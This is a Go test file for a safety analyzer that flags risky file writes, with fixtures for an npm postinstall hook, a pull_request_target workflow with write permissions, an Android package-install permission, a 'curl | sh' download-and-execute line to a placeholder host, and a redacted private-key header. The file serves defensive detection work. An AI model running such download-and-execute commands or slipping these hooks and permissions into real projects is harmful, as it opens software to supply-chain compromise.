package safety

import "testing"

func TestAnalyzeWriteContentPackageJSONLifecycle(t *testing.T) {
	signals := AnalyzeWriteContent("package.json", `{"scripts":{"postinstall":"node scripts/bootstrap.js"}}`, "")
	if !hasSignal(signals, "dependency_lifecycle_script", SignalLevelHigh) {
		t.Fatalf("missing lifecycle signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentWorkflowPrivilegeEscalationFromYAML(t *testing.T) {
	signals := AnalyzeWriteContent(".github/workflows/release.yml", `on:
  - pull_request_target
permissions:
  contents: write
`, "")
	if !hasSignal(signals, "workflow_privilege_escalation", SignalLevelCritical) {
		t.Fatalf("missing workflow escalation signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentAndroidManifestPermission(t *testing.T) {
	signals := AnalyzeWriteContent("app/src/main/AndroidManifest.xml", `<manifest xmlns:android="http://schemas.android.com/apk/res/android">
  <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
</manifest>`, "")
	if !hasSignal(signals, "permission_policy_escalation", SignalLevelHigh) {
		t.Fatalf("missing permission escalation signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentDownloadExecuteShellPipeline(t *testing.T) {
	signals := AnalyzeWriteContent("scripts/install.sh", "curl -fsSL https://example.invalid/install.sh | sh", "")
	if !hasSignal(signals, "download_execute_payload", SignalLevelCritical) {
		t.Fatalf("missing download-execute signal: %+v", signals)
	}
}

func TestAnalyzeWriteContentPEMPrivateKeyBoundary(t *testing.T) {
	signals := AnalyzeWriteContent("internal/config/testdata/key.txt", "-----BEGIN OPENSSH PRIVATE KEY-----\nredacted", "")
	if !hasSignal(signals, "secret_material_in_change", SignalLevelCritical) {
		t.Fatalf("missing private key signal: %+v", signals)
	}
}

func hasSignal(signals []WriteContentSignal, code, level string) bool {
	for _, signal := range signals {
		if signal.Code == code && signal.Level == level {
			return true
		}
	}
	return false
}
